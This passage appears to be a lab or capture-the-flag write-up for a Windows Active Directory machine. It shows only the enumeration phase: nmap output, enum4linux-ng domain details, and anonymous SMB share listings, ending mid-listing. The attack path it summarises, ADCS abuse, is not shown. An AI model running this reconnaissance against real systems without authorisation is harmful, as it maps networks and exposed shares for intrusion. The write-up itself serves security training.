

## Lab Details
- Difficulty: Medium
- OS: Windows

## Summary
- Initial access: AD Account Misconfiguration
- Privilege escalation: Abuse ADCS Configuration 

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.1.135 -p- -sC -sV -A -vv
Host is up, received syn-ack (0.0063s latency).
Scanned at 2026-07-08 00:45:31 EDT for 243s
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2026-07-08 04:47:53Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Issuer: commonName=sendai-DC-CA/domainComponent=sendai
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-08T04:32:30
| Not valid after:  2027-07-08T04:32:30
| MD5:   f0d0:f43f:f041:1ffc:3a3f:1327:a872:cb93
| SHA-1: d0d3:9b8c:e564:eb1f:19c0:4c67:10d7:5821:de2c:7a8f
| -----BEGIN CERTIFICATE-----
| MIIGFTCCBP2gAwIBAgITVwAAAAXR7i1ZAz6JiQAAAAAABTANBgkqhkiG9w0BAQsF
| ADBDMRIwEAYKCZImiZPyLGQBGRYCdmwxFjAUBgoJkiaJk/IsZAEZFgZzZW5kYWkx
| FTATBgNVBAMTDHNlbmRhaS1EQy1DQTAeFw0yNjA3MDgwNDMyMzBaFw0yNzA3MDgw
| NDMyMzBaMBcxFTATBgNVBAMTDGRjLnNlbmRhaS52bDCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBANnh4o0W6HWlkZ45OVjk0NriwucOJ3nwbG+0YE2i+php
| CrBaK5fwqBqOG4RYGDrjp14egcuwvDTBCei6LkB9vaOEHZ9juGeKLzzt1T4vudxy
| sUI/aD6K/azK0+SA+qIvv4JYqCFNImxNiy1pnzBAHYBkjxYtYORZLgfbwkJcDsfo
| n9kkQzPSttBmILu4IWXRH9JAgyhHc/Ffyj5wNQvEH9X3wTEhdEfQwjEwj831tvw/
| ShDOXr+QGJI60Om8PJmkJSzKqeZifF9PQ+wmIzK635VWeUx5cMdvGWUzvD7bS4YP
| uJISD8iaQ9cGyofQdLZDSOc/uEQV2jgFg+ysYGmtuVECAwEAAaOCAywwggMoMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTMwODU4NzI3NDItNTcwOTcyODIzLTczNjc2NDEz
| Mi0xMDAwMDgGA1UdEQQxMC+gHwYJKwYBBAGCNxkBoBIEEB6FyoYBEbdOhIdd+rz6
| DSGCDGRjLnNlbmRhaS52bDAdBgNVHQ4EFgQURzsDxCR65uGPCBSpwkyaJTNoXKww
| HwYDVR0jBBgwFoAUSemJy2wGmS2/ToDZ6jjJnKaooz4wgcMGA1UdHwSBuzCBuDCB
| taCBsqCBr4aBrGxkYXA6Ly8vQ049c2VuZGFpLURDLUNBLENOPWRjLENOPUNEUCxD
| Tj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1
| cmF0aW9uLERDPXNlbmRhaSxEQz12bD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0
| P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbwGCCsGAQUF
| BwEBBIGvMIGsMIGpBggrBgEFBQcwAoaBnGxkYXA6Ly8vQ049c2VuZGFpLURDLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlbmRhaSxEQz12bD9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0B
| AQsFAAOCAQEAW8O0R3colkwZzOtyi41JNiz4df6CXdKXCxC6NHmI0ybE/ulQiSdg
| StyFRn5k7xCjOHi7iP1J10oMVZvjiDZM50btnA/jFGXTjlRiaJRSMjLZeynWO7df
| zsGqKtwaWBE9+UFXfmK7fvq7YrpfKK9XoFG7bhIXKDL/4ge2wEcsSaNTLEfzqoHa
| l8G8U7T7iXSpg1ElQcOC5/q0bFEH3J69Q+pVlV11AVoJCbJ+2VgJTM7aO9sijj6V
| +HbtWddAhtOTd94GDo43ndAtRDL5sUnPggZvagXFxkJrmEFU72XegwoN+EVYE58k
| bEFu6WctRt4L0Akz5b16xY3Pshx/tAeaeA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
443/tcp   open  ssl/http      syn-ack Microsoft IIS httpd 10.0
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: DNS:dc.sendai.vl
| Issuer: commonName=dc.sendai.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-18T12:39:21
| Not valid after:  2024-07-18T00:00:00
| MD5:   3223:91f5:f1f7:4e16:738e:382d:053e:c7fa
| SHA-1: 5282:f809:dcc9:8d53:e9a1:065a:25a1:c741:fa2c:4bc5
| -----BEGIN CERTIFICATE-----
| MIIC9TCCAd2gAwIBAgIQKG7SWIn2M6tPyGomAHBoSjANBgkqhkiG9w0BAQsFADAX
| MRUwEwYDVQQDEwxkYy5zZW5kYWkudmwwHhcNMjMwNzE4MTIzOTIxWhcNMjQwNzE4
| MDAwMDAwWjAXMRUwEwYDVQQDEwxkYy5zZW5kYWkudmwwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDcBXcByvqbxTJwsmevy4Bj83CH0vCBzz3cev/4fxMG
| Ill5epHVaQJSNAwCRseP2KJYUqfpUaZuJTjhvtm9V6uRdhBNy9xtMH/kGfx6KVeO
| TViixsc/X5DCROAcjUhnsXJa1pmtcTItDn+f0VMYbjHsMGqM+yOeguPSXPztnMWZ
| TtuwKH/EnyUIOtxo3tIuCLthRt4W36r6I9kkYmpWhPyuhVssAFuQ8fL7JyVTFWBE
| cvG9YO0a4B8+t4PBnUKdMf8n0I6viITltxQpSby1Atlx1lF9OngDK/sKnxiYSzFw
| 64bOIRU8EVAo8dCab5ZrHM2H2KphvaFWccccJGytsz2FAgMBAAGjPTA7MAsGA1Ud
| DwQEAwIEsDATBgNVHSUEDDAKBggrBgEFBQcDATAXBgNVHREEEDAOggxkYy5zZW5k
| YWkudmwwDQYJKoZIhvcNAQELBQADggEBAB9DGOlZwCpk4UGmyYa7R+D924WY6QQ7
| nHLlL/F1KKXY29Ps2WKj4EwPkWrwBmMy6T5rIyJJIIuM4SIXWeXCjOo7RcLkYoM4
| eyONMuzZINzzr83EypJbygJVt4wPlYPJpkP8Xsl4Y3RCYiRqVeDmW+sUfOh4NmBo
| jS9ra3d/LtStdVbMGtWEIXGISSZN0v5ygCAQMUSrcCbvDJESHJrALGJ8TLLLn86p
| qivJSaN69CybqAILhPph0/yb7iBG4LH06LXq7Ros7r5c8kaMjELOHSb+DsiDfGfM
| kYMg/u4NFqroRzmHFo1Z0H/vN4Au33hmsj6pCVzGnQDMs2/mDAfLKLg=
|_-----END CERTIFICATE-----
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Issuer: commonName=sendai-DC-CA/domainComponent=sendai
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-08T04:32:30
| Not valid after:  2027-07-08T04:32:30
| MD5:   f0d0:f43f:f041:1ffc:3a3f:1327:a872:cb93
| SHA-1: d0d3:9b8c:e564:eb1f:19c0:4c67:10d7:5821:de2c:7a8f
| -----BEGIN CERTIFICATE-----
| MIIGFTCCBP2gAwIBAgITVwAAAAXR7i1ZAz6JiQAAAAAABTANBgkqhkiG9w0BAQsF
| ADBDMRIwEAYKCZImiZPyLGQBGRYCdmwxFjAUBgoJkiaJk/IsZAEZFgZzZW5kYWkx
| FTATBgNVBAMTDHNlbmRhaS1EQy1DQTAeFw0yNjA3MDgwNDMyMzBaFw0yNzA3MDgw
| NDMyMzBaMBcxFTATBgNVBAMTDGRjLnNlbmRhaS52bDCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBANnh4o0W6HWlkZ45OVjk0NriwucOJ3nwbG+0YE2i+php
| CrBaK5fwqBqOG4RYGDrjp14egcuwvDTBCei6LkB9vaOEHZ9juGeKLzzt1T4vudxy
| sUI/aD6K/azK0+SA+qIvv4JYqCFNImxNiy1pnzBAHYBkjxYtYORZLgfbwkJcDsfo
| n9kkQzPSttBmILu4IWXRH9JAgyhHc/Ffyj5wNQvEH9X3wTEhdEfQwjEwj831tvw/
| ShDOXr+QGJI60Om8PJmkJSzKqeZifF9PQ+wmIzK635VWeUx5cMdvGWUzvD7bS4YP
| uJISD8iaQ9cGyofQdLZDSOc/uEQV2jgFg+ysYGmtuVECAwEAAaOCAywwggMoMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTMwODU4NzI3NDItNTcwOTcyODIzLTczNjc2NDEz
| Mi0xMDAwMDgGA1UdEQQxMC+gHwYJKwYBBAGCNxkBoBIEEB6FyoYBEbdOhIdd+rz6
| DSGCDGRjLnNlbmRhaS52bDAdBgNVHQ4EFgQURzsDxCR65uGPCBSpwkyaJTNoXKww
| HwYDVR0jBBgwFoAUSemJy2wGmS2/ToDZ6jjJnKaooz4wgcMGA1UdHwSBuzCBuDCB
| taCBsqCBr4aBrGxkYXA6Ly8vQ049c2VuZGFpLURDLUNBLENOPWRjLENOPUNEUCxD
| Tj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1
| cmF0aW9uLERDPXNlbmRhaSxEQz12bD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0
| P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbwGCCsGAQUF
| BwEBBIGvMIGsMIGpBggrBgEFBQcwAoaBnGxkYXA6Ly8vQ049c2VuZGFpLURDLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlbmRhaSxEQz12bD9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0B
| AQsFAAOCAQEAW8O0R3colkwZzOtyi41JNiz4df6CXdKXCxC6NHmI0ybE/ulQiSdg
| StyFRn5k7xCjOHi7iP1J10oMVZvjiDZM50btnA/jFGXTjlRiaJRSMjLZeynWO7df
| zsGqKtwaWBE9+UFXfmK7fvq7YrpfKK9XoFG7bhIXKDL/4ge2wEcsSaNTLEfzqoHa
| l8G8U7T7iXSpg1ElQcOC5/q0bFEH3J69Q+pVlV11AVoJCbJ+2VgJTM7aO9sijj6V
| +HbtWddAhtOTd94GDo43ndAtRDL5sUnPggZvagXFxkJrmEFU72XegwoN+EVYE58k
| bEFu6WctRt4L0Akz5b16xY3Pshx/tAeaeA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: sendai.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.sendai.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.sendai.vl
| Issuer: commonName=sendai-DC-CA/domainComponent=sendai
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-08T04:32:30
| Not valid after:  2027-07-08T04:32:30
| MD5:   f0d0:f43f:f041:1ffc:3a3f:1327:a872:cb93
| SHA-1: d0d3:9b8c:e564:eb1f:19c0:4c67:10d7:5821:de2c:7a8f
| -----BEGIN CERTIFICATE-----
| MIIGFTCCBP2gAwIBAgITVwAAAAXR7i1ZAz6JiQAAAAAABTANBgkqhkiG9w0BAQsF
| ADBDMRIwEAYKCZImiZPyLGQBGRYCdmwxFjAUBgoJkiaJk/IsZAEZFgZzZW5kYWkx
| FTATBgNVBAMTDHNlbmRhaS1EQy1DQTAeFw0yNjA3MDgwNDMyMzBaFw0yNzA3MDgw
| NDMyMzBaMBcxFTATBgNVBAMTDGRjLnNlbmRhaS52bDCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBANnh4o0W6HWlkZ45OVjk0NriwucOJ3nwbG+0YE2i+php
| CrBaK5fwqBqOG4RYGDrjp14egcuwvDTBCei6LkB9vaOEHZ9juGeKLzzt1T4vudxy
| sUI/aD6K/azK0+SA+qIvv4JYqCFNImxNiy1pnzBAHYBkjxYtYORZLgfbwkJcDsfo
| n9kkQzPSttBmILu4IWXRH9JAgyhHc/Ffyj5wNQvEH9X3wTEhdEfQwjEwj831tvw/
| ShDOXr+QGJI60Om8PJmkJSzKqeZifF9PQ+wmIzK635VWeUx5cMdvGWUzvD7bS4YP
| uJISD8iaQ9cGyofQdLZDSOc/uEQV2jgFg+ysYGmtuVECAwEAAaOCAywwggMoMC8G
| CSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAd
| BgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgG
| CSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAL
| BglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBglghkgBZQME
| AQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwTQYJKwYBBAGCNxkCBEAwPqA8BgorBgEE
| AYI3GQIBoC4ELFMtMS01LTIxLTMwODU4NzI3NDItNTcwOTcyODIzLTczNjc2NDEz
| Mi0xMDAwMDgGA1UdEQQxMC+gHwYJKwYBBAGCNxkBoBIEEB6FyoYBEbdOhIdd+rz6
| DSGCDGRjLnNlbmRhaS52bDAdBgNVHQ4EFgQURzsDxCR65uGPCBSpwkyaJTNoXKww
| HwYDVR0jBBgwFoAUSemJy2wGmS2/ToDZ6jjJnKaooz4wgcMGA1UdHwSBuzCBuDCB
| taCBsqCBr4aBrGxkYXA6Ly8vQ049c2VuZGFpLURDLUNBLENOPWRjLENOPUNEUCxD
| Tj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1
| cmF0aW9uLERDPXNlbmRhaSxEQz12bD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0
| P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgbwGCCsGAQUF
| BwEBBIGvMIGsMIGpBggrBgEFBQcwAoaBnGxkYXA6Ly8vQ049c2VuZGFpLURDLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXNlbmRhaSxEQz12bD9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0B
| AQsFAAOCAQEAW8O0R3colkwZzOtyi41JNiz4df6CXdKXCxC6NHmI0ybE/ulQiSdg
| StyFRn5k7xCjOHi7iP1J10oMVZvjiDZM50btnA/jFGXTjlRiaJRSMjLZeynWO7df
| zsGqKtwaWBE9+UFXfmK7fvq7YrpfKK9XoFG7bhIXKDL/4ge2wEcsSaNTLEfzqoHa
| l8G8U7T7iXSpg1ElQcOC5/q0bFEH3J69Q+pVlV11AVoJCbJ+2VgJTM7aO9sijj6V
| +HbtWddAhtOTd94GDo43ndAtRDL5sUnPggZvagXFxkJrmEFU72XegwoN+EVYE58k
| bEFu6WctRt4L0Akz5b16xY3Pshx/tAeaeA==
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
|_ssl-date: 2026-07-08T04:49:27+00:00; -6s from scanner time.
| ssl-cert: Subject: commonName=dc.sendai.vl
| Issuer: commonName=dc.sendai.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-07T04:41:34
| Not valid after:  2027-01-06T04:41:34
| MD5:   393e:7b8d:8c21:6220:1d0d:f497:b1ff:7afd
| SHA-1: 53f9:0aa6:9216:4773:5e07:cf3c:1666:cf65:3e0f:7739
| -----BEGIN CERTIFICATE-----
| MIIC3DCCAcSgAwIBAgIQFKLktd0w1qVILE3CsbvSATANBgkqhkiG9w0BAQsFADAX
| MRUwEwYDVQQDEwxkYy5zZW5kYWkudmwwHhcNMjYwNzA3MDQ0MTM0WhcNMjcwMTA2
| MDQ0MTM0WjAXMRUwEwYDVQQDEwxkYy5zZW5kYWkudmwwggEiMA0GCSqGSIb3DQEB
| AQUAA4IBDwAwggEKAoIBAQDRaA9CrfDUuEYGc3t5Hj0wNNXn/5KND9+9lMRqUhAd
| KADjEFF1FebyOfooJar8E5Y4HyzJ2uzVi9g18Z/9KoGO8jUVpuaGkCrzhCa26g7p
| t+yvvpms0qwIuQar+X2UE5lz+5Lt45h9xDBeLcQ68yBw3MYpS6lcQ0WVFdB6Ue++
| JQEbRzEFapxfZUWxaERzmnwVzC8NmG1SUqR5sxoadmpaD5bC/7fepPkGn88JizWM
| bpuClZbGbrjPMUJcWJP/qld+gAowy9+6GRjpLbFjvetd1J6X44shCMpv+bsoTguf
| rIwLcT8oBmEMyfh899avWg4Nlr2wJjTdtkylrbxT3OuBAgMBAAGjJDAiMBMGA1Ud
| JQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEA
| tKvPrHgJ4y2OTreL6GD/hS8IhcYz3bKS2a69XavkI3zW9t2KBH1DdiB2dWN2UNxf
| DmYdOfymnI0Yj2D6dmDNf5Hp4Rmy5+UwB0jOfXUpkczlC86nQ9rMXlcHUsv/7rNE
| 4+bdec5YITdv8zDfXQxx9vftYBpSpSnadNnYTsNwWpcCXfwX1kM1t1l4e7Fg9ucY
| JvSjFtqL7BclgH+PODyHl/jq4z1apPZESFbNW85O90/n6zRe6a9oRcY20KRmGRYM
| 7IsTT1AFVsSB01Uwxbre7wikdzoWmjdWEClVljybB1ZcX9RaOU0heUO5MRQYeL1h
| /onmX37ROuxSYCUA99fD7A==
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
53539/tcp open  msrpc         syn-ack Microsoft Windows RPC
57500/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
57501/tcp open  msrpc         syn-ack Microsoft Windows RPC
57518/tcp open  msrpc         syn-ack Microsoft Windows RPC
62910/tcp open  msrpc         syn-ack Microsoft Windows RPC
62918/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -6s, deviation: 0s, median: -7s
| smb2-time: 
|   date: 2026-07-08T04:48:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 28369/tcp): CLEAN (Timeout)
|   Check 2 (port 40716/tcp): CLEAN (Timeout)
|   Check 3 (port 38725/udp): CLEAN (Timeout)
|   Check 4 (port 54006/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```
- Run `enum4linux-ng` to get the domain info
```
$ enum4linux-ng 10.129.1.135
 ===========================================================
|    Domain Information via SMB session for 10.129.1.135    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: SENDAI
DNS domain: sendai.vl
FQDN: dc.sendai.vl
Derived membership: domain member
Derived domain: SENDAI
```
- Enumerate SMB anonymously
```
$ smbclient -L //10.129.1.135/ -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	config          Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	sendai          Disk      company share
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```
- Anonymous user has read access to `sendai` and `users` SMB share
```
$ smbclient //10.129.1.135/sendai
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                   D        0  Tue Jul 18 13:31:04 2023
  ..                                DHS        0  Tue Apr 15 22:55:42 2025
  hr                                  D        0  Tue Jul 11 08:58:19 2023
  incident.txt                        A     1372  Tue Jul 18 13:34:15 2023
  it                                  D        0  Tue Jul 18 09:16:46 2023
  legal                               D        0  Tue Jul 11 08:58:23 2023
  security                            D        0  Tue Jul 18 09:17:35 2023
  transfer                            D        0  Tue Jul 11 09:00:20 2023

\hr
  .                                   D        0  Tue Jul 11 08:58:19 2023
  ..                                  D        0  Tue Jul 18 13:31:04 2023

\it
  .                                   D        0  Tue Jul 18 09:16:46 2023
  ..                                  D        0  Tue Jul 18 13:31:04 2023
  Bginfo64.exe                        A  2774440  Tue Jul 18 09:16:43 2023
  PsExec64.exe                        A   833472  Tue Jul 18 09:16:38 2023

\legal
  .                                   D        0  Tue Jul 11 08:58:23 2023
  ..                                  D        0  Tue Jul 18 13:31:04 2023

\security
  .                                   D        0  Tue Jul 18 09:17:35 2023
  ..                                  D        0  Tue Jul 18 13:31:04 2023
  guidelines.txt                      A     4538  Tue Jul 18 09:18:34 2023

\transfer
  .                                   D        0  Tue Jul 11 09:00:20 2023
  ..                                  D        0  Tue Jul 18 13:31:04 2023
  anthony.smith                       D        0  Tue Jul 11 08:59:50 2023
  clifford.davey                      D        0  Tue Jul 11 09:00:06 2023
  elliot.yates                        D        0  Tue Jul 11 08:59:26 2023
  lisa.williams                       D        0  Tue Jul 11 08:59:34 2023
  susan.harper                        D        0  Tue Jul 11 08:59:39 2023
  temp                                D        0  Tue Jul 11 09:00:16 2023
  thomas.powell                       D        0  Tue Jul 11 08:59:45 2023

\transfer\anthony.smith
  .                                   D        0  Tue Jul 11 08:59:50 2023
  ..                                  D        0  Tue Jul 11 09:00:20 2023

\transfer\clifford.davey
  .                                   D        0  Tue Jul 11 09:00:06 2023
  ..                                  D        0  Tue Jul 11 09:00:20 2023

\transfer\elliot.yates
  .                                   D        0  Tue Jul 11 08:59:26 2023
  ..                                  D        0  Tue Jul 11 09:00:20 2023

\transfer\lisa.williams
  .                                   D        0  Tue Jul 11 08:59:34 2023
  ..                                  D        0  Tue Jul 11 09:00:20 2023

\transfer\susan.harper
  .                                   D        0  Tue Jul 11 08:59:39 2023
  ..                                  D        0  Tue Jul 11 09:00:20 2023

\transfer\temp
  .                                   D        0  Tue Jul 11 09:00:16 2023
  ..                                  D        0  Tue Jul 11 09:00:20 2023

\transfer\thomas.powell
  .                                   D        0  Tue Jul 11 08:59:45 2023
  ..                                  D        0  Tue Jul 11 09:00:20 2023

		7019007 blocks of size 4096. 1178464 blocks available

```
- List `Users` share
```
$ smbclient //10.129.1.135/Users
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> ls
  .                                  DR        0  Tue Jul 11 05:58:27 2023
  ..                                DHS        0  Tue Apr 15 22:55:42 2025
  Default                           DHR        0  Tue Jul 11 12:36:32 2023
  desktop.ini                       AHS      174  Sat May  8 04:18:31 2021
  Public                             DR        0  Tue Jul 11 03:36:58 2023

\Default
  .                                 DHR        0  Tue Jul 11 12:36:32 2023
  ..                                 DR        0  Tue Jul 11 05:58:27 2023
  AppData                            DH        0  Sat May  8 04:20:24 2021
  Desktop                            DR        0  Sat May  8 04:20:24 2021
  Documents                          DR        0  Tue Jul 11 12:36:32 2023
  Downloads                          DR        0  Sat May  8 04:20:24 2021
  Favorites                          DR        0  Sat May  8 04:20:24 2021
  Links                              DR        0  Sat May  8 04:20:24 2021
  Music                              DR        0  Sat May  8 04:20:24 2021
  Pictures                           DR        0  Sat May  8 04:20:24 2021
  Saved Games                        Dn        0  Sat May  8 04:20:24 2021
  Videos                             DR        0  Sat May  8 04:20:24 2021

\Public
  .                                  DR        0  Tue Jul 11 03:36:58 2023
  ..                                 DR        0  Tue Jul 11 05:58:27 2023
  AccountPictures                   DHR        0  Tue Jul 11 03:36:58 2023
  desktop.ini                       AHS      174  Sat May  8 04:18:31 2021
  Documents                          DR        0  Tue Jul 11 12:36:32 2023
  Downloads                          DR        0  Sat May  8 04:20:26 2021
  Libraries                         DHR        0  Sat May  8 04:34:49 2021
  Music                              DR        0  Sat May  8 04:20:26 2021
  Pictures                           DR        0  Sat May  8 04:20:26 2021
  Videos                             DR        0  Sat May  8 04:20:26 2021

\Default\AppData
  .                                  DH        0  Sat May  8 04:20:24 2021
  ..                                DHR        0  Tue Jul 11 12:36:32 2023
  Local                               D        0  Tue Jul 11 12:36:32 2023
  Roaming                             D        0  Sat May  8 04:34:59 2021

\Default\Desktop
  .                                  DR        0  Sat May  8 04:20:24 2021
  ..                                DHR        0  Tue Jul 11 12:36:32 2023

\Default\Documents
  .                                  DR        0  Tue Jul 11 12:36:32 2023
  ..                                DHR        0  Tue Jul 11 12:36:32 2023

\Default\Downloads
  .                                  DR        0  Sat May  8 04:20:24 2021
  ..                                DHR        0  Tue Jul 11 12:36:32 2023

\Default\Favorites
  .                                  DR        0  Sat May  8 04:20:24 2021
  ..                                DHR        0  Tue Jul 11 12:36:32 2023

\Default\Links
  .                                  DR        0  Sat May  8 04:20:24 2021
  ..                                DHR        0  Tue Jul 11 12:36:32 2023

\Default\Music
  .                                  DR        0  Sat May  8 04:20:24 2021
  ..                                DHR        0  Tue Jul 11 12:36:32 2023

\Default\Pictures
  .                                  DR        0  Sat May  8 04:20:24 2021
  ..                                DHR        0  Tue Jul 11 12:36:32 2023

\Default\Saved Games
  .                                  Dn        0  Sat May  8 04:20:24 2021
  ..                                DHR        0  Tue Jul 11 12:36:32 2023

\Default\Videos
  .                                  DR        0  Sat May  8 04:20:24 2021
  ..                                DHR        0  Tue Jul 11 12:36:32 2023

\Public\AccountPictures
  .                                 DHR        0  Tue Jul 11 03:36:58 2023
  ..                                 DR        0  Tue Jul 11 03:36:58 2023
  desktop.ini                       AHS      196  Tue Jul 11 03:36:58 2023

\Public\Documents
  .                                  DR        0  Tue Jul 11 12:36:32 2023
  ..                                 DR        0  Tue Jul 11 03:36:58 2023
  desktop.ini                       AHS      278  Sat May  8 04:18:31 2021

\Public\Downloads
  .                                  DR        0  Sat May  8 04:20:26 2021
